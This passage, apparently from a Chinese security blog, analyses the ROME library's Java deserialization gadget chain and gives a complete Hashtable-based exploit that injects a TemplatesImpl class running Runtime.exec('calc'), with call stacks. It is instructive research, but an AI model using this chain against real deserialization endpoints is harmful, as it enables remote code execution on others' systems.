        <span class="k">if</span> <span class="o">((</span><span class="n">methods</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getModifiers</span><span class="o">()</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="o">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
            <span class="c1">// 如果 setters 参数为 true，处理写入方法</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">setters</span><span class="o">)</span> <span class="o">{</span>
                <span class="c1">// 检查方法名是否以 "set" 开头，返回类型为 void，且参数个数为 1</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">methods</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getName</span><span class="o">().</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"set"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">methods</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getReturnType</span><span class="o">()</span> <span class="o">==</span> <span class="n">Void</span><span class="o">.</span><span class="na">TYPE</span> <span class="o">&amp;&amp;</span> <span class="n">methods</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getParameterTypes</span><span class="o">().</span><span class="na">length</span> <span class="o">==</span> <span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
                    <span class="c1">// 获取属性名</span>
                    <span class="n">pName</span> <span class="o">=</span> <span class="n">Introspector</span><span class="o">.</span><span class="na">decapitalize</span><span class="o">(</span><span class="n">methods</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getName</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="mi">3</span><span class="o">));</span>
                    <span class="c1">// 创建属性描述符，使用 null 作为读取方法，当前方法作为写入方法</span>
                    <span class="n">pDescriptor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PropertyDescriptor</span><span class="o">(</span><span class="n">pName</span><span class="o">,</span> <span class="o">(</span><span class="n">Method</span><span class="o">)</span><span class="kc">null</span><span class="o">,</span> <span class="n">methods</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
                <span class="o">}</span>
            <span class="o">}</span> 
            <span class="c1">// 如果 setters 参数为 false，处理读取方法</span>
            <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">methods</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getName</span><span class="o">().</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"get"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">methods</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getReturnType</span><span class="o">()</span> <span class="o">!=</span> <span class="n">Void</span><span class="o">.</span><span class="na">TYPE</span> <span class="o">&amp;&amp;</span> <span class="n">methods</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getParameterTypes</span><span class="o">().</span><span class="na">length</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                <span class="c1">// 检查方法名是否以 "get" 开头，返回类型不为 void，且参数个数为 0</span>
                <span class="n">pName</span> <span class="o">=</span> <span class="n">Introspector</span><span class="o">.</span><span class="na">decapitalize</span><span class="o">(</span><span class="n">methods</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getName</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="mi">3</span><span class="o">));</span>
                <span class="n">pDescriptor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PropertyDescriptor</span><span class="o">(</span><span class="n">pName</span><span class="o">,</span> <span class="n">methods</span><span class="o">[</span><span class="n">i</span><span class="o">],</span> <span class="o">(</span><span class="n">Method</span><span class="o">)</span><span class="kc">null</span><span class="o">);</span>
            <span class="o">}</span>
            <span class="c1">// 检查方法名是否以 "is" 开头，返回类型为 boolean，且参数个数为 0 </span>
            <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">methods</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getName</span><span class="o">().</span><span class="na">startsWith</span><span class="o">(</span><span class="s">"is"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">methods</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getReturnType</span><span class="o">()</span> <span class="o">==</span> <span class="n">Boolean</span><span class="o">.</span><span class="na">TYPE</span> <span class="o">&amp;&amp;</span> <span class="n">methods</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getParameterTypes</span><span class="o">().</span><span class="na">length</span> <span class="o">==</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">pName</span> <span class="o">=</span> <span class="n">Introspector</span><span class="o">.</span><span class="na">decapitalize</span><span class="o">(</span><span class="n">methods</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="na">getName</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="mi">2</span><span class="o">));</span>
                <span class="n">pDescriptor</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PropertyDescriptor</span><span class="o">(</span><span class="n">pName</span><span class="o">,</span> <span class="n">methods</span><span class="o">[</span><span class="n">i</span><span class="o">],</span> <span class="o">(</span><span class="n">Method</span><span class="o">)</span><span class="kc">null</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="k">if</span> <span class="o">(</span><span class="n">pName</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">pds</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">pName</span><span class="o">,</span> <span class="n">pDescriptor</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
    <span class="c1">// 返回属性描述符的 Map 对象</span>
    <span class="k">return</span> <span class="n">pds</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>最后执行完getPDs得到的结果如下：<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120124631-e17e0c66-b74e-1.png"/><br/>
函数调用栈：</p>
<div class="highlight"><pre><span></span><span class="nl">getPDs:</span><span class="mi">54</span><span class="o">,</span> <span class="n">BeanIntrospector</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">getPropertyDescriptors:</span><span class="mi">41</span><span class="o">,</span> <span class="n">BeanIntrospector</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">toString:</span><span class="mi">129</span><span class="o">,</span> <span class="n">ToStringBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">toString:</span><span class="mi">116</span><span class="o">,</span> <span class="n">ToStringBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">beanHashCode:</span><span class="mi">193</span><span class="o">,</span> <span class="n">EqualsBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">hashCode:</span><span class="mi">110</span><span class="o">,</span> <span class="n">ObjectBean</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">syndication</span><span class="o">.</span><span class="na">feed</span><span class="o">.</span><span class="na">impl</span><span class="o">)</span>
<span class="nl">hash:</span><span class="mi">338</span><span class="o">,</span> <span class="n">HashMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">1397</span><span class="o">,</span> <span class="n">HashMap</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invokeReadObject:</span><span class="mi">1058</span><span class="o">,</span> <span class="n">ObjectStreamClass</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readSerialData:</span><span class="mi">1900</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readOrdinaryObject:</span><span class="mi">1801</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject0:</span><span class="mi">1351</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">readObject:</span><span class="mi">371</span><span class="o">,</span> <span class="n">ObjectInputStream</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">)</span>
<span class="nl">main:</span><span class="mi">50</span><span class="o">,</span> <span class="n">ObjectBeanExp</span> <span class="o">(</span><span class="n">RomeSec</span><span class="o">)</span>
</pre></div>
<p>回到ToStringBean中的toString方法，执行完getPropertyDescriptors方法得到的结果就是获取到了TemplatesImpl类的getOutputProperties方法相关信息，继续往下执行<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240120124652-edfdeec0-b74e-1.png"/><br/>
然后调用了TemplatesImpl类的getOutputProperties方法，接下来就是TemplatesImpl类的方法调用链</p>
<h3 data-content="1" id="91176ba8f491790e3d97aeb2a472b3b9">相关问题</h3>
<p><strong>问题一</strong>：_equalsBeans是EqualsBean对象，如何得来？<br/>
在ObjectBean类中有下面两个构造方法：</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="nf">ObjectBean</span><span class="o">(</span><span class="n">Class</span> <span class="n">beanClass</span><span class="o">,</span> <span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">(</span><span class="n">beanClass</span><span class="o">,</span> <span class="n">obj</span><span class="o">,</span> <span class="o">(</span><span class="n">Set</span><span class="o">)</span><span class="kc">null</span><span class="o">);</span>
<span class="o">}</span>

<span class="kd">public</span> <span class="nf">ObjectBean</span><span class="o">(</span><span class="n">Class</span> <span class="n">beanClass</span><span class="o">,</span> <span class="n">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="n">Set</span> <span class="n">ignoreProperties</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">_equalsBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">EqualsBean</span><span class="o">(</span><span class="n">beanClass</span><span class="o">,</span> <span class="n">obj</span><span class="o">);</span>
    <span class="k">this</span><span class="o">.</span><span class="na">_toStringBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ToStringBean</span><span class="o">(</span><span class="n">beanClass</span><span class="o">,</span> <span class="n">obj</span><span class="o">);</span>
    <span class="k">this</span><span class="o">.</span><span class="na">_cloneableBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CloneableBean</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">ignoreProperties</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
<p>查看EqualsBean的构造方法</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="nf">EqualsBean</span><span class="o">(</span><span class="n">Class</span> <span class="n">beanClass</span><span class="o">,</span> <span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">if</span> <span class="o">(!</span><span class="n">beanClass</span><span class="o">.</span><span class="na">isInstance</span><span class="o">(</span><span class="n">obj</span><span class="o">))</span> <span class="o">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">+</span> <span class="s">" is not instance of "</span> <span class="o">+</span> <span class="n">beanClass</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
        <span class="k">this</span><span class="o">.</span><span class="na">_beanClass</span> <span class="o">=</span> <span class="n">beanClass</span><span class="o">;</span>
        <span class="k">this</span><span class="o">.</span><span class="na">_obj</span> <span class="o">=</span> <span class="n">obj</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>所以这里可以得知obj需要是beanClass的实例化对象</p>
<p><strong>问题二</strong>：这里的EqualsBean对象的_obj是ToStringBean对象，如何得来？<br/>
通过上面的分析可知，EqualsBean的_obj必须是ToStringBean对象，这样才能EqualsBean的beanHashCode方法中调用到ToStringBean的toString方法，因此EqualsBean的_beanClass方法必须是ToStringBean类</p>
<p>因此，根据ObjectBean和EqualsBean的构造方法，可以得如下exp的构造：</p>
<div class="highlight"><pre><span></span><span class="c1">// 创建ObjectBean对象</span>
<span class="n">ObjectBean</span> <span class="n">objectBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectBean</span><span class="o">(</span><span class="n">ToStringBean</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">toStringBean</span><span class="o">);</span>
<span class="n">setFiled</span><span class="o">(</span><span class="n">objectBean</span><span class="o">,</span><span class="s">"_toStringBean"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
<span class="n">setFiled</span><span class="o">(</span><span class="n">objectBean</span><span class="o">,</span> <span class="s">"_cloneableBean"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
</pre></div>
<p><strong>问题三</strong>：这里的ToStringBean对象的_obj是TemplatesImpl对象，如何得来？<br/>
在ToStringBean的toString方法中，大致意思就是传递一个类，获取该类的set或者get方法，并且能够使用invoke调用，这里就可以利用TemplatesImpl链<br/>
在如下代码中</p>
<div class="highlight"><pre><span></span><span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">pReadMethod</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">_obj</span><span class="o">,</span> <span class="n">NO_PARAMS</span><span class="o">);</span>
</pre></div>
<p>要执行一个对象的方法，invoke第一个参数就是该对象，因此这里是构造的ToStringBean对象的_obj属性是TemplatesImpl对象</p>
<p>而_beanClass的由来需要看这一句</p>
<div class="highlight"><pre><span></span><span class="n">PropertyDescriptor</span><span class="o">[]</span> <span class="n">pds</span> <span class="o">=</span> <span class="n">BeanIntrospector</span><span class="o">.</span><span class="na">getPropertyDescriptors</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">_beanClass</span><span class="o">);</span>
</pre></div>
<p>getPropertyDescriptors方法的大致作用是获取一个类的get或set方法，这里需要调用TemplatesImpl的getOutputProperties方法，就必须传入对应的类，这里选择传入接口Templates</p>
<p>查看ToStringBean的构造方法</p>
<div class="highlight"><pre><span></span><span class="kd">protected</span> <span class="nf">ToStringBean</span><span class="o">(</span><span class="n">Class</span> <span class="n">beanClass</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">_beanClass</span> <span class="o">=</span> <span class="n">beanClass</span><span class="o">;</span>
    <span class="k">this</span><span class="o">.</span><span class="na">_obj</span> <span class="o">=</span> <span class="k">this</span><span class="o">;</span>
<span class="o">}</span>

<span class="kd">public</span> <span class="nf">ToStringBean</span><span class="o">(</span><span class="n">Class</span> <span class="n">beanClass</span><span class="o">,</span> <span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">_beanClass</span> <span class="o">=</span> <span class="n">beanClass</span><span class="o">;</span>
    <span class="k">this</span><span class="o">.</span><span class="na">_obj</span> <span class="o">=</span> <span class="n">obj</span><span class="o">;</span>
<span class="o">}</span>
</pre></div>
<p>故有如下exp构造</p>
<div class="highlight"><pre><span></span><span class="c1">// 创建ToStringBean对象</span>
<span class="n">ToStringBean</span> <span class="n">toStringBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ToStringBean</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">templateImpl</span><span class="o">);</span>
</pre></div>
<p><strong>注</strong>：当然这里也可以不需要在外面套一层ObjectBean，直接将构造的EqualsBean放入HashMap中也可以</p>
<h2 data-content="1" id="264384be616e73220e40fc9ef65e3fc3">5. HashTable利用链</h2>
<h3 data-content="1" id="be27cf71efd5218cf2a86bdea94c1cd4">利用链</h3>
<div class="highlight"><pre><span></span><span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">getOutputProperties</span><span class="o">()</span>
<span class="n">ToStringBean</span><span class="o">.</span><span class="na">toString</span><span class="o">(</span><span class="n">String</span><span class="o">)</span>
<span class="n">ToStringBean</span><span class="o">.</span><span class="na">toString</span><span class="o">()</span>
<span class="n">EqualsBean</span><span class="o">.</span><span class="na">beanHashCode</span><span class="o">()</span>
<span class="n">EqualsBean</span><span class="o">.</span><span class="na">hashCode</span><span class="o">()</span>
<span class="n">ObjetBean</span><span class="o">.</span><span class="na">hashCode</span><span class="o">()</span>
<span class="n">HashTable</span><span class="o">.</span><span class="na">reconstitutionPut</span><span class="o">()</span>
<span class="n">HashTable</span><span class="o">.</span><span class="na">readObject</span><span class="o">(</span><span class="n">ObjectInputStream</span><span class="o">)</span>
</pre></div>
<h3 data-content="1" id="62ca19608ebc2e2d716599b4aa4d9365">EXP</h3>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">RomeSec</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.sun.syndication.feed.impl.ObjectBean</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.sun.syndication.feed.impl.ToStringBean</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.xml.transform.Templates</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Hashtable</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HashTableExp</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
        <span class="n">String</span> <span class="n">AbstractTranslet</span><span class="o">=</span><span class="s">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="o">;</span>
        <span class="n">String</span> <span class="n">TemplatesImpl</span><span class="o">=</span><span class="s">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="o">;</span>

        <span class="c1">// 创建恶意类</span>
        <span class="n">ClassPool</span> <span class="n">classPool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
        <span class="n">classPool</span><span class="o">.</span><span class="na">appendClassPath</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">);</span>
        <span class="n">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="n">classPool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">"cccc"</span><span class="o">);</span>
        <span class="n">ctClass</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">classPool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">AbstractTranslet</span><span class="o">));</span>
        <span class="n">ctClass</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">setBody</span><span class="o">(</span><span class="s">"java.lang.Runtime.getRuntime().exec(\"calc\");"</span><span class="o">);</span>
        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>

        <span class="c1">// 创建TemplatesImpl对象</span>
        <span class="n">Object</span> <span class="n">templateImpl</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="n">TemplatesImpl</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="k">new</span> <span class="n">Class</span><span class="o">[]{}).</span><span class="na">newInstance</span><span class="o">();</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">templateImpl</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">bytes</span><span class="o">});</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">templateImpl</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"test"</span><span class="o">);</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">templateImpl</span><span class="o">,</span> <span class="s">"_tfactory"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>

        <span class="c1">// 创建ToStringBean对象</span>
        <span class="n">ToStringBean</span> <span class="n">toStringBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ToStringBean</span><span class="o">(</span><span class="n">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">templateImpl</span><span class="o">);</span>
        <span class="c1">// 创建ObjectBean对象</span>
        <span class="n">ObjectBean</span> <span class="n">objectBean</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectBean</span><span class="o">(</span><span class="n">ToStringBean</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">toStringBean</span><span class="o">);</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">objectBean</span><span class="o">,</span><span class="s">"_toStringBean"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
        <span class="n">setFiled</span><span class="o">(</span><span class="n">objectBean</span><span class="o">,</span> <span class="s">"_cloneableBean"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>

        <span class="c1">// 创建HashTable</span>
        <span class="n">Hashtable</span> <span class="n">hashtable</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">();</span>
        <span class="n">hashtable</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">objectBean</span><span class="o">,</span> <span class="s">"test"</span><span class="o">);</span>

        <span class="c1">// 序列化</span>
        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">"HashTable.bin"</span><span class="o">));</span>
        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">hashtable</span><span class="o">);</span>
        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>

        <span class="c1">// 反序列化</span>
        <span class="n">ObjectInputStream</span> <span class="n">objectInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">"HashTable.bin"</span><span class="o">));</span>
        <span class="n">objectInputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
        <span class="n">objectInputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFiled</span><span class="o">(</span><span class="n">Object</span> <span class="n">o</span><span class="o">,</span> <span class="n">String</span> <span class="n">fieldname</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">o</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldname</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">o</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<h3 data-content="1" id="1b71ddad2e06282474717cc0ca82e408">函数调用栈</h3>
<div class="highlight"><pre><span></span><span class="nl">exec:</span><span class="mi">347</span><span class="o">,</span> <span class="n">Runtime</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">)</span>
<span class="o">&lt;</span><span class="n">clinit</span><span class="o">&gt;:-</span><span class="mi">1</span><span class="o">,</span> <span class="n">cccc</span>
<span class="nl">newInstance0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeConstructorAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">newInstance:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeConstructorAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">newInstance:</span><span class="mi">45</span><span class="o">,</span> <span class="n">DelegatingConstructorAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">newInstance:</span><span class="mi">422</span><span class="o">,</span> <span class="n">Constructor</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">newInstance:</span><span class="mi">442</span><span class="o">,</span> <span class="n">Class</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">)</span>
<span class="nl">getTransletInstance:</span><span class="mi">455</span><span class="o">,</span> <span class="n">TemplatesImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xalan</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">xsltc</span><span class="o">.</span><span class="na">trax</span><span class="o">)</span>
<span class="nl">newTransformer:</span><span class="mi">486</span><span class="o">,</span> <span class="n">TemplatesImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xalan</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">xsltc</span><span class="o">.</span><span class="na">trax</span><span class="o">)</span>
<span class="nl">getOutputProperties:</span><span class="mi">507</span><span class="o">,</span> <span class="n">TemplatesImpl</span> <span class="o">(</span><span class="n">com</span><span class="o">.</span><span class="na">sun</span><span class="o">.</span><span class="na">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">xalan</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">xsltc</span><span class="o">.</span><span class="na">trax</span><span class="o">)</span>
<span class="nl">invoke0:</span><span class="o">-</span><span class="mi">1</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">62</span><span class="o">,</span> <span class="n">NativeMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">43</span><span class="o">,</span> <span class="n">DelegatingMethodAccessorImpl</span> <span class="o">(</span><span class="n">sun</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
<span class="nl">invoke:</span><span class="mi">497</span><span class="o">,</span> <span class="n">Method</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">)</span>
